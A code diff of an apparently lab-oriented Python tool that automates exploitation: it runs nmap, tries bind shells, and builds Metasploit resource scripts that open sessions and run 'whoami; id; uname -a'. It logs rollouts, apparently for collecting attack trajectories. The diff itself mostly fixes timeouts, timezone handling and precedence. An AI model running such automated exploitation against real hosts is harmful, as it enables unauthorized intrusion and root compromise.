@@ -1,3 +1,5 @@
+from __future__ import annotations
+
 import argparse
 import ipaddress
 import json
@@ -7,7 +9,7 @@ import socket
 import subprocess
 import tempfile
 from copy import deepcopy
-from datetime import datetime, UTC
+from datetime import datetime, timezone
 from pathlib import Path
 
 
@@ -69,7 +71,11 @@ MSF_MODULES = {
 
 
 def now_str():
-    return datetime.now(UTC).strftime("%Y-%m-%dT%H-%M-%SZ")
+    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")
+
+
+def now_iso():
+    return datetime.now(timezone.utc).isoformat()
 
 
 def validate_private_target(target: str):
@@ -119,19 +125,34 @@ def empty_state():
 
 
 def run_command(cmd, timeout=120, input_text=None):
-    result = subprocess.run(
-        cmd,
-        input=input_text,
-        capture_output=True,
-        text=True,
-        timeout=timeout,
-    )
-    return {
-        "cmd": cmd,
-        "returncode": result.returncode,
-        "stdout": result.stdout or "",
-        "stderr": result.stderr or "",
-    }
+    try:
+        result = subprocess.run(
+            cmd,
+            input=input_text,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+        )
+        return {
+            "cmd": cmd,
+            "returncode": result.returncode,
+            "stdout": result.stdout or "",
+            "stderr": result.stderr or "",
+        }
+    except subprocess.TimeoutExpired as e:
+        return {
+            "cmd": cmd,
+            "returncode": -1,
+            "stdout": e.stdout or "",
+            "stderr": f"TimeoutExpired after {timeout}s",
+        }
+    except FileNotFoundError as e:
+        return {
+            "cmd": cmd,
+            "returncode": -1,
+            "stdout": "",
+            "stderr": f"Command not found: {cmd[0]} ({e})",
+        }
 
 
 def run_nmap(target: str, service_scan: bool):
@@ -240,7 +261,7 @@ def try_bindshell(target: str):
     success = (
         "uid=0" in output
         or "root" in output
-        or "linux" in output and result["returncode"] == 0
+        or ("linux" in output and result["returncode"] == 0)
     )
 
     return {
@@ -254,7 +275,6 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
     config = MSF_MODULES[action]
 
     rc_lines = [
-        "spool /tmp/msf_auto_spool.log",
         f"use {config['module']}",
         f"set RHOSTS {target}",
         f"set RHOST {target}",
@@ -275,7 +295,6 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
         "sessions -C \"whoami; id; uname -a\"",
         "sleep 2",
         "sessions -K",
-        "spool off",
         "exit -y",
     ])
 
@@ -404,7 +423,6 @@ def build_plan(n_runs: int):
 def apply_action(action, state, target, lhost, raw_dir, run_id, step):
     done = False
     resolved_action = action
-
     before_state = deepcopy(state)
 
     if action == "auto_exploit":
@@ -537,7 +555,6 @@ def apply_action(action, state, target, lhost, raw_dir, run_id, step):
 def rollout(actions, policy, target, lhost, raw_dir, run_id):
     state = empty_state()
     history = []
-
     done = False
 
     for idx, action in enumerate(actions, start=1):
@@ -649,7 +666,7 @@ def main():
             "run_id": run_id,
             "target": args.target,
             "lhost": lhost,
-            "created_at": datetime.now(UTC).isoformat(),
+            "created_at": now_iso(),
             "policy_name": policy,
             "action_plan": actions,
             "final_success": final_success,
